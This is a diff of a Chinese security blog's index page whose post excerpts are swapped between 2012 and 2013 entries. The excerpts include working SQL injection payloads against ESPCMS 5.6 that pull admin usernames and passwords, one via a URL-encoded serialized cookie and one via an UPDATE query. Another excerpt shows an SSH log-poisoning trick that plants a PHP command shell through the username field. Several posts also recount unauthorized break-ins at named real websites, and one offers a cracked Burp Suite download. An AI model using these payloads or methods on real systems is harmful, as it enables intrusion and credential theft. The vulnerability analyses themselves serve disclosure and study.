@@ -45,33 +45,37 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-08T07:13:39.000Z" itemprop="datePublished">
-          2012-07-08
+      <time datetime="2013-04-12T00:09:32.000Z" itemprop="datePublished">
+          2013-04-12
       </time>
     
     
     | 
-    <a href='/tag/fckeditor/'>fckeditor</a>,
-    
-    <a href='/tag/C段/'>C段</a>,
-    
-    <a href='/tag/上传漏洞/'>上传漏洞</a>,
-    
-    <a href='/tag/弱口令/'>弱口令</a>
+    <a href='/tag/Cookie注入/'>Cookie注入</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/659.seo/">hei快拍官网的过程</a></h2>
+      <h2 class="post-title"><a href="/990.seo/">易思ESPCMS Cookie注入</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><p>记录下，不应说黑，应说是改快拍二维码官网首页。</p>  <p>闲着无聊，老师出差中。。。无心学习，果断玩下渗透</p>  <p>看准了目标，就来快拍吧 域名：<a href="http://www.kuaipai.cn/">www.kuaipai.cn</a></p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/hei_E03/clip_image001.jpg" width="767" height="771" /></p>  <p>简单查看了下，整站是php的，没打算从主站入手，直接<a href="http://ha.cker.in/tag/C段" target="_blank">c段</a>算了，嘿嘿，其实卖关子了，现在正式开始</p>  <p>直接IIS PUT 跑121.101.22x.1- 121.101.22x.254 这个网段的ip，经过测试，发现一个疑似有<a href="http://ha.cker.in/tag/弱口令" target="_blank">弱口令</a>的登陆点</p>  <p></p>
+        <p>易思ESPCMS企业网站管理系统基于LAMP开发构建的企业网站管理系统。</p>  <p>易思ESPCMS企业网站管理系统V5.6存在<a href="http://ha.cker.in/tag/Cookie注入" target="_blank">Cookie注入</a>漏洞，攻击者可利用此漏洞破坏应用，执行未授权操作。</p>  <p>   <div id="scid:812469c5-0cb0-4c63-8c15-c81123a09de7:5efce5bb-b75c-4f7e-af58-060d623dc458" class="wlWriterEditableSmartContent" style="float: none; padding-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; display: inline; padding-right: 0px"><pre name="code" class="php:nogutter:nocontrols">function in_list() {<br><br>parent::start_pagetemplate();<br><br>$lng = (admin_LNG == ‘big5’) ? $this-&gt;CON[‘is_lancode’] : admin_LNG;<br><br>$cartid = $this-&gt;fun-&gt;accept(‘ecisp_order_list’, ‘C’); //接收cookies[‘ecisp_order_list’]<br><br>$cartid = stripslashes(htmlspecialchars_decode($cartid));<br><br>$uncartid = !empty($cartid) ? unserialize($cartid) : 0; //$cartid有特殊的格式要求<br><br>if ($uncartid &amp;&amp; is_array($uncartid)) {<br><br>$didarray = $this-&gt;fun-&gt;key_array_name($uncartid, ‘did’, ‘amount’);<br><br>$didlist = $this-&gt;fun-&gt;format_array_text(array_keys($didarray), ‘,’);<br><br>if (!empty($didlist)) {<br><br>$db_table = db_prefix . ‘document’;<br><br>$db_where = “isclass=1 AND isorder=1 AND did in($didlist) ORDER BY did DESC”;<br><br>$sql=”SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,addtime,template,filename,filepath FROM $db_table WHERE $db_where”; //动态构造sql语句<br><br>$rs = $this-&gt;db-&gt;query($sql); //直接带入查询<br><br></pre></div><br>直接获取cookies[<code>ecisp_order_list</code>]的值，没有经过过滤，直接被用来构造了sql语句，并带入了查询。所以此处形成了一个cookie注入。</p>
+
+<p>接收到的cookies[<code>ecisp_order_list</code>]在整个传递过程中，经过了htmlspecialchars_decode()、stripslashes()、unserialize()、key_array_name()、array_keys()、format_array_text()几个函数。</p>
+
+<p>其中stripslashes()使得注入语句可以无视GPC的影响。</p>
+
+<p>但是，由于unserialize()的使用，使得构造exp的难度加大；因为传入unserialize()的值，必须使用一种规定的特殊格式（实施上，我也没有完全吃透这个特殊格式）</p>
+
+<p>我就依靠运气，和一点小技巧，成功地构造出了exp，这里就不细说了。大家可以通过打印几个函数的返回值，来找到构造的方法。（或者，也可以通过下面的exp，来找寻一些规律）</p>
+
+<p>a%3a1%3a%7bs%3a3%3a%22k23%22%3ba%3a2%3a%7bs%3a3%3a%22did%22%3bs%3a159%3a%2224)+and+1%3d2+union+select+1%2c2%2c3%2c4%2c5%2c6%2c7%2c8%2c9%2c10%2c11%2c12%2c13%2c14%2c15%2c16%2cpassword%2cusername%2c19%2c20%2c21%2c22%2c23%2c24%2c25%2c26%2c27%2c28%2c29%2c30%2c31+from+espcms_admin_member+where+1+in+(1%22%3bs%3a6%3a%22amount%22%3bi%3a1%3b%7d%7d</p><br>
       
       </p>
       
       <p>
-          <a href="/659.seo/" class="excerpt-link">Read More...</a>
+          <a href="/990.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -80,166 +84,168 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-08T07:06:36.000Z" itemprop="datePublished">
-          2012-07-08
+      <time datetime="2013-04-11T08:41:59.000Z" itemprop="datePublished">
+          2013-04-11
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/钓鱼/'>钓鱼</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/656.seo/">对某钓鱼网站的一次渗透</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>某天在淘宝上买了点东西，和店主确认几句之后，他发来一个链接，让我去支付。    <br />七转八转来到这个页面:     <br /><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/8f598be352ba_B732/clip_image001.jpg" width="516" height="345" />     <br />我看了一下这个网址不对劲，是<a href="http://item.taobao.com-xxxx.co.tv/pay/，莫非我遇上了传说中的淘宝钓鱼？于是立马来了精神，那就顺势检测一下这个钓鱼网站吧。">http://item.taobao.com-xxxx.co.tv/pay/，莫非我遇上了传说中的淘宝钓鱼？于是立马来了精神，那就顺势检测一下这个钓鱼网站吧。</a>     <br />先试试手气，在网址后面加个login.asp，居然看到了后台登录页面！     <br /><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/8f598be352ba_B732/clip_image002.jpg" width="444" height="321" />     <br />试了几个弱口令和万能密码都无果。但是我发现，当用户名输入”admin”，密码为”123”的时候，提示”你输入的密码有误！”；而用户名输入”123”,密码为”123”时，则提示“你输入的用户名有误！”。</p>
-      
-      </p>
-      
-      <p>
-          <a href="/656.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-07-03T20:20:57.000Z" itemprop="datePublished">
-          2012-07-04
-      </time>
-    
-    
-    | 
-    <a href='/tag/社工/'>社工</a>,
-    
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/黑客/'>黑客</a>,
-    
-    <a href='/tag/免杀/'>免杀</a>,
-    
-    <a href='/tag/九区大黑阔/'>九区大黑阔</a>,
-    
-    <a href='/tag/抓鸡/'>抓鸡</a>,
-    
-    <a href='/tag/嗅探/'>嗅探</a>,
-    
-    <a href='/tag/C段/'>C段</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/647.seo/">嗅探+社工拿下独特365服务器</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>DiS9 TeAm    <br /><a href="http://ha.cker.in/tag/九区大黑阔" target="_blank">大黑阔</a>站啊 网站注册    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/365_ACDA/clip_image002.jpg" width="558" height="280" />    <br />尼玛各种帖子加起来 几千万 上亿都可能。    <br /><a href="http://ha.cker.in/tag/免杀" target="_blank">免杀</a>无敌 <a href="http://ha.cker.in/tag/抓鸡" target="_blank">抓鸡</a>无敌    <br />主站 dz2.5x 原来看见一个getshell&#160; 不能发表日志，后来用管理员账号登陆 日志发了 getshell 射不到</p>  <p>主站一个 没利用价值   <br />果断C 迅速拿下两个,发现是vps 蛋疼。    <br /><a href="http://ha.cker.in/tag/C段" target="_blank">C段</a>两个都是独站    <br />一个卖东西的 只是一个简单的html站点 其他链接全是淘宝 目录下打包了一个文件 下载后 发现是serv-u 以为是站长从网上下的放在这 后来破解密码 FTP直接连了。。。。。    <br />还有一个是DEDE5.7 0day没补 root权限 UDF 提权    <br />上服务器arp -a 发现与目标一个段 下载CAIN 对方服务器<a href="http://ha.cker.in/tag/嗅探" target="_blank">嗅探</a>10分钟后 就挂了。。。但是就是这10分钟 你说我运气怎么又这么好。。</p>
-      
-      </p>
-      
-      <p>
-          <a href="/647.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-07-02T11:01:57.000Z" itemprop="datePublished">
-          2012-07-02
-      </time>
-    
-    
-    | 
-    <a href='/tag/burpsuite/'>burpsuite</a>,
-    
-    <a href='/tag/破解/'>破解</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/631.seo/">burpsuite pro v1.4.07破解版下载</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><a href="http://ha.cker.in/tag/burpsuite" target="_blank">burpsuite</a> pro v1.4.07<a href="http://ha.cker.in/tag/破解" target="_blank">破解</a>版</p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="Secer&#39;s Blog：http://ha.cker.in/" border="0" alt="Secer&#39;s Blog：http://ha.cker.in/" src="http://img.cker.in/burpsuiteprov1.4.07_29DB/image.png" width="908" height="702" /> </p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="image" border="0" alt="image" src="http://img.cker.in/burpsuiteprov1.4.07_29DB/image_3.png" width="400" height="191" /> </p>  <p align="center">下载地址：</p>
-      
-      </p>
-      
-      <p>
-          <a href="/631.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-07-02T10:15:59.000Z" itemprop="datePublished">
-          2012-07-02
-      </time>
-    
-    
-    | 
-    <a href='/tag/ACL/'>ACL</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/625.seo/">编程实现遍历ACL访问控制列表检查进程访问权限</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><b>Author:Pnig0s[FreeBuf]</b></p>  <p>阅读本文的朋友需要对Windows访问控制模型有初步的了解，了解Token(访问令牌)，<a href="http://ha.cker.in/tag/ACL" target="_blank">ACL</a>(访问控制列表)，DACL(选择访问控制列表)，ACE(访问控制列表项)等与访问控制模型相关的名词含义及之间的关系，当然我也会在文中简要科普一下ACM。</p>  <p>写这篇文章的目的主要是最近在写一个Win下本地提权的东西，涉及到了对ACL的操作，以前对ACL总是避而远之，Windows访问控制模型比较头疼，一个API会牵出一大把要用的API。毕竟涉及到用户访问的安全，肯定不能让编程人员随意更改这些机制，复杂一些也可以理解，可是能参考的资料很少，MSDN上关于一些访问控制相关API的使用和结构体的描述也含糊不清也没有什么代码实例。这篇文章也是在查阅国外了一些文献加上自己研究测试后完成的，发出来希望对涉及这方面编程的朋友有帮助。</p>  <p><b>—&gt;&gt;</b><b>熟悉</b><b>Windows</b><b>访问控制机制的可以跳过本段：</b></p>  <p>因为是科普我这里简单介绍下Windows访问控制模型(ACM)，别嫌我啰嗦，懂得直接Pass往下看。ACM中最重要的两部分是访问令牌(Access Token)和安全描述符表(Security Descriptor)。访问令牌存在于访问主体中，安全描述符表存在于访问客体中。比如我去米国，我就是访问主体，米国就是访问客体，我持有的签证就是访问令牌。系统中访问主体是进程客体是一切系统对象。访问令牌中有当前用户的唯一标识SID，组唯一标识SID以及一些权限标志(Privilege)。安全描述符表(SD)存在于Windows系统中的任何对象中(文件，注册表，互斥量，信号量等等)。SD中包含对象所有者的SID，组SID以及两个非常重要的数据结构选择访问控制列表(DACL)和系统访问控制列表(SACL)，其中SACL涉及系统日志用的很少可以先无视。DACL中包含一个个ACE访问控制入口也是权限访问判断的核心，当一个进程访问某一对象的时候，对象会将进程的Token与自身的ACE依次比对，直到被允许或被拒绝，前面的ACE优于后面的ACE。整体的一个权限检查过程如下图：</p>  <p><b>—&gt;&gt;</b></p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/ACL_1E70/clip_image001.jpg" width="389" height="264" /></p>
-      
-      </p>
-      
-      <p>
-          <a href="/625.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
-  
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-07-02T09:39:36.000Z" itemprop="datePublished">
-          2012-07-02
-      </time>
-    
-    
-    | 
-    <a href='/tag/ssh/'>ssh</a>,
-    
     <a href='/tag/漏洞/'>漏洞</a>,
     
-    <a href='/tag/包含漏洞/'>包含漏洞</a>
+    <a href='/tag/SQL注入/'>SQL注入</a>,
+    
+    <a href='/tag/Espcms/'>Espcms</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/622.seo/">利用SSH来包含执行命令</a></h2>
+      <h2 class="post-title"><a href="/989.seo/">易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>转自<a href="http://www.ayhacker.net/ayblog/read.php?173">http://www.ayhacker.net/ayblog/read.php?173</a></p>
-<p>文章的总体思路就是：<br>使用<br>ssh ‘&lt;pre&gt;&lt;?echo system($_GET[‘cmd’]); exit;?&gt;’@10.10.11.33登入，然后会在<a href="http://ha.cker.in/tag/ssh" target="_blank">ssh</a>的登入日志里记录，再让存在<a href="http://ha.cker.in/tag/包含漏洞" target="_blank">包含漏洞</a>php去包含错误日志文件来达到目的。<br>包含正常的日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image001" src="http://img.cker.in/SSH_C60/clip_image001.png" alt="clip_image001" width="819" height="322" border="0" /><br>使用特定的一句话木马作为帐号登入，产生含有一句话的日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image002" src="http://img.cker.in/SSH_C60/clip_image002.png" alt="clip_image002" width="635" height="87" border="0" /><br>再次包含日志文件<br><img style="display: inline; border-width: 0px;" title="clip_image003" src="http://img.cker.in/SSH_C60/clip_image003.png" alt="clip_image003" width="1171" height="208" border="0" /><br>成功执行</p>
+        <p><a href="http://ha.cker.in/tag/Espcms" target="_blank">Espcms</a> <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a><a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a> 第二弹     <br /><a href="http://team.f4ck.net/thread-10337-1-1.html">http://team.f4ck.net/thread-10337-1-1.html</a></p>  <p>   <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统基于LAMP开发构建的企业网站管理系统。     <br />易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统V5.6.13.04.03的会员中心模块存在<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>漏洞，攻击者可利用此漏洞破坏应用，执行未授权操作。</p>  <p>漏洞文件: interface/membermain.php    <br /></p>  <pre>function in_save() {<br>                parent::start_pagetemplate();<br>                parent::member_purview();<br>                $lng = (admin_LNG == ‘big5’) ? $this-&gt;CON[‘is_lancode’] : admin_LNG;<br>                $inputclass = $this-&gt;fun-&gt;accept(‘inputclass’, ‘R’);<br>                $upurl = $this-&gt;fun-&gt;accept(‘upurl’, ‘R’);<br>                $userid = intval($this-&gt;fun-&gt;accept(‘userid’, ‘P’));<br>                $username = $this-&gt;fun-&gt;accept(‘username’, ‘P’);<br>                if (empty($userid) || empty($username)) {<br>                        $linkURL = $this-&gt;mlink[‘center’];<br>                        $this-&gt;callmessage($this-&gt;lng[‘member_edit_ok’], $linkURL, $this-&gt;lng[‘gobackurlbotton’]);<br>                }<br>                $email = trim($this-&gt;fun-&gt;accept(‘email’, ‘P’));<br>                $question = trim($this-&gt;fun-&gt;accept(‘question’, ‘P’, true, true));<br>                $answer = trim($this-&gt;fun-&gt;accept(‘answer’, ‘P’, true, true));<br>                $alias = trim($this-&gt;fun-&gt;accept(‘alias’, ‘P’, true, true));//通过一个accept函数,确定为post提交<br>                $sex = $this-&gt;fun-&gt;accept(‘sex’, ‘P’);//注得就是你了.$sex可控,<br>                $sex = empty($sex) ? 0 : $sex;<br>                $tel = trim($this-&gt;fun-&gt;accept(‘tel’, ‘P’, true, true));<br>                $mobile = trim($this-&gt;fun-&gt;accept(‘mobile’, ‘P’, true, true));<br>                $birthday = $this-&gt;fun-&gt;accept(‘birthday’, ‘P’);<br>                $birthday = empty($birthday) ? 0 : $this-&gt;fun-&gt;formatdate($birthday, 4);<br>                $country = intval($this-&gt;fun-&gt;accept(‘cityone’, ‘P’));<br>                $country = empty($country) ? 0 : $country;<br>                $province = intval($this-&gt;fun-&gt;accept(‘citytwo’, ‘P’));<br>                $province = empty($province) ? 0 : $province;<br>                $city = intval($this-&gt;fun-&gt;accept(‘citythree’, ‘P’));<br>                $city = empty($city) ? 0 : $city;<br>                $district = intval($this-&gt;fun-&gt;accept(‘district’, ‘P’));<br>                $district = empty($district) ? 0 : $district;<br>                $address = trim($this-&gt;fun-&gt;accept(‘address’, ‘P’, true, true));<br>                $zipcode = trim($this-&gt;fun-&gt;accept(‘zipcode’, ‘P’, true, true));<br>                $zipcode = empty($zipcode) ? 0 : $zipcode;<br>                $msn = trim($this-&gt;fun-&gt;accept(‘msn’, ‘P’, true, true));<br>                $qq = $this-&gt;fun-&gt;accept(‘qq’, ‘P’);<br>                $qq = empty($qq) ? 0 : $qq;<br><br>                $db_table = db_prefix . ‘member’;<br>                $db_table2 = db_prefix . ‘member_value’;</pre><br><br><p>下面来看看怎么进行入库处理的吧。<br>  <br />$db_where = ‘userid=’ . $userid;<br><br>  <br />$db_set= &quot;sex=$sex,birthday=$birthday,country=$country,province=$province,city=$city,district=$district,alias=’$alias’,address=’$address’,zipcode=$zipcode,tel=’$tel’,mobile=’$mobile’,qq=$qq,msn=’$msn’&quot;;<br><br>  <br />$this-&gt;db-&gt;query(‘UPDATE ‘ . $db_table . ‘ SET ‘ . $db_set . ‘ WHERE ‘ . $db_where);</p>
+
+<p>Update注入,看了下数据库,address为varchar。</p>
+
+<p>因为这个cms有个防报错的函数,构造遇到了点麻烦,一出错就显示Can not connect to Mysql server,<br>  <br />&#160;</p>
+
+<p>追踪下此函数:<br>  <br /></p>
+
+<pre>function halt($message = '', $sql = '') { 
+                $db_err = !db_err ? 0 : db_err; 
+                $db_sql = !db_sql ? 0 : db_sql; 
+                $mysqlinfo = '&lt;font size=&quot;2&quot;&gt;&lt;b&gt;ESPCMS SQL Error:&lt;/b&gt; Can not connect to MySQL server&lt;b&gt;Time:&lt;/b&gt;' . date('e Y-m-d H-i-s', time()); 
+                $mysqlinfo.= $db_sql ? '&lt;b&gt;SQL:&lt;/b&gt;' . $sql : ''; 
+                $mysqlinfo.= $db_err ? '&lt;b&gt;Error：&lt;/b&gt;' . mysql_error() : ''; 
+                $mysqlinfo.= '&lt;a target=&quot;_blank&quot; href=&quot;http://www.espcms.com&quot;&gt;http://www.espcms.com&lt;/a&gt; Access Query Errors&lt;/font&gt;'; 
+
+                exit($mysqlinfo); 
+        }</pre>
+
+<p>为了方便构造, 把出错的sql语句和出错的提示都打印出来。<br>  <br />sex=1,birthday=2013-04-02,country=0,province=0,city=0,district=0,alias=1,address=(select concat(username,CHAR(0x7c),password) from espcms_admin_member limit 1),zipcode=0,tel=0,mobile=0,qq=0,msn=0/<em>&amp;birthday=2013-04-02&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=12&amp;zipcode=0&amp;tel=&amp;mobile=&amp;msn=&amp;qq=</em>/</p><br>
       
       </p>
       
       <p>
-          <a href="/622.seo/" class="excerpt-link">Read More...</a>
+          <a href="/989.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-04-01T01:00:24.000Z" itemprop="datePublished">
+          2013-04-01
+      </time>
+    
+    
+    | 
+    <a href='/tag/注入/'>注入</a>,
+    
+    <a href='/tag/iis解析漏洞/'>iis解析漏洞</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/988.seo/">入侵韩国某购物网并提权</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>文章作者:enjoyhack</p>  <p>昨天搞完泰国那个服务器后随便看了个韩国的的购物网站（看样子是像个购物网站，具体是不是我也不清楚，棒子的语言看不懂啊！！）。懂棒子语言的朋友不妨告诉下是什么类型的网站，呵呵。</p>  <p><a href="http://img.cker.in/d8f2e315c472_EEC3/clip_image002.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/d8f2e315c472_EEC3/clip_image002_thumb.jpg" width="604" height="354" /></a></p>  <p>看样子还是和中国某些B2B商城系统类似，刚开始的时候顺便检测了下<a href="http://ha.cker.in/tag/注入" target="_blank">注入</a>，发现没法注入后便在网站随便逛了逛，看到有个新闻页后面有留言的地方。</p>  <p><a href="http://img.cker.in/d8f2e315c472_EEC3/clip_image004.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/d8f2e315c472_EEC3/clip_image004_thumb.jpg" width="604" height="264" /></a></p>  <p>虽然语言不通，但是操作界面还是熟悉的，这里应该就可以上传图片了。</p>  <p><a href="http://img.cker.in/d8f2e315c472_EEC3/clip_image005.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/d8f2e315c472_EEC3/clip_image005_thumb.jpg" width="361" height="461" /></a></p>  <p>直接传了个<a href="http://ha.cker.in/tag/IIS解析漏洞" target="_blank">IIS解析漏洞</a>利用的图片马上去。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/988.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-04-01T00:56:51.000Z" itemprop="datePublished">
+          2013-04-01
+      </time>
+    
+    
+    | 
+    <a href='/tag/一句话/'>一句话</a>,
+    
+    <a href='/tag/xss/'>xss</a>,
+    
+    <a href='/tag/SQL注入/'>SQL注入</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/987.seo/">对国外黑客论坛 hackerstown.com 的一次测试</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image001.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/hackerstown.com_ED8E/clip_image001_thumb.jpg" width="396" height="144" /></a></p>  <p>最近太忙了，一直没更新博客！先谈谈气候吧，尼玛南方冷死了！我现在是出门穿再多都哆嗦啊！</p>  <p>日，你什么时候来啊，我还是喜欢大热天吹电风扇，擦~ 大热天还可以裸睡，多爽！ </p>  <p>好吧，不扯谈了，对于为什么突然日这个站，其实还是前几天在看我网易博客的时候突然又看到之前一老外在&quot;<a href="http://ps.s.blog.163.com/blog/static/89878892201211311548478/">About EvilShad0w Team</a>&quot; 这篇日志下留言并留了个地址，如图：</p>  <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image003.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/hackerstown.com_ED8E/clip_image003_thumb.jpg" width="381" height="212" /></a></p>  <p>前几天就看到这条评论，就点开了网址看见是个黑客论坛，版块内容还比较丰富，其中很多文章都还不错，突然试试入侵，于是先看他是什么程序吧。 通过分析论坛结构，确定为“MyBB”，于是通过之前收藏的一个国外exploit 公布站搜索了下这个程序，结果出来了很多 ，有<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>、信息泄露、<a href="http://ha.cker.in/tag/XSS" target="_blank">XSS</a>、远程代码执行。但一一试过，都无效。貌似已经打全补丁了。好吧，该我自己整合的字典上阵了！扫描完后发现路径都是一般常见的路径，我一一点击尝试访问都出现403 Forbidden，在访问其中 xxxx/的时候发现根路径泄露</p>  <p><a href="http://img.cker.in/hackerstown.com_ED8E/clip_image004.jpg"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/hackerstown.com_ED8E/clip_image004_thumb.jpg" width="336" height="51" /></a></p>  <p>还有目录遍历，然后再点击三级目录发现上传页面，只能浏览当前目录，并且禁止了上传，只能重命名文件还有写txt文件， 尼玛！ 我通过一个小页面写入txt文件，但是无法重命名，这时候我发给Liuker一起看，我俩啥后缀都试过了就是不能解析，一定是做限制了，在写文件的时候尝试跳目录也没成功，突然想到上传 .htaccess 来解析 jpg类似正常后缀突破，但是测试了下失败！Liuker用他字典扫到两个根目录的无内容PHP页面，通过一句话后门破解也没成功。My God…………<a href="http://img.cker.in/hackerstown.com_ED8E/clip_image005.gif"><img style="display: inline" title="clip_image005" alt="clip_image005" src="http://img.cker.in/hackerstown.com_ED8E/clip_image005_thumb.gif" width="19" height="19" /></a></p>  <p>继续吧，翻了翻当前的目录，发现了有几个压缩文件。</p><br>
+      
+      </p>
+      
+      <p>
+          <a href="/987.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-03-29T20:57:23.000Z" itemprop="datePublished">
+          2013-03-30
+      </time>
+    
+</span>
+      <h2 class="post-title"><a href="/986.seo/">两个有意思的视频</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        卢正雨嘻哈三部曲之绝世神功    &#160;  神视觉!!动作连贯、一气呵成、故事完整!! 
+
+      
+      </p>
+      
+      <p>
+          <a href="/986.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2013-03-28T22:41:37.000Z" itemprop="datePublished">
+          2013-03-29
+      </time>
+    
+    
+    | 
+    <a href='/tag/盐/'>盐</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/985.seo/">盐</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        盐（Salt），在密码学中，是指通过在密码任意固定位置插入特定的字符串，让散列后的结果和使用原始密码的散列结果不相符，这种过程称之为“加盐”。  安全因素  通常情况下，当字段经过散列处理（如MD5），会生成一段散列值，而散列后的值一般是无法通过特定算法得到原始字段的。但是某些情况，比如一个大型的彩虹表，通过在表中搜索该MD5值，很有可能在极短的时间内找到该散列值对应的真实字段内容。  加盐后的散列值，可以极大的降低由于用户数据被盗而带
+      
+      </p>
+      
+      <p>
+          <a href="/985.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -247,7 +253,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/page/23/">← Newer Posts</a>
-    <span class="page-number">Page 24 of 57</span>
+    <span class="page-number">Page 24 of 81</span>
     <a class="older-posts" href="/page/25/">Older Posts →</a>
   </nav>
 </main>
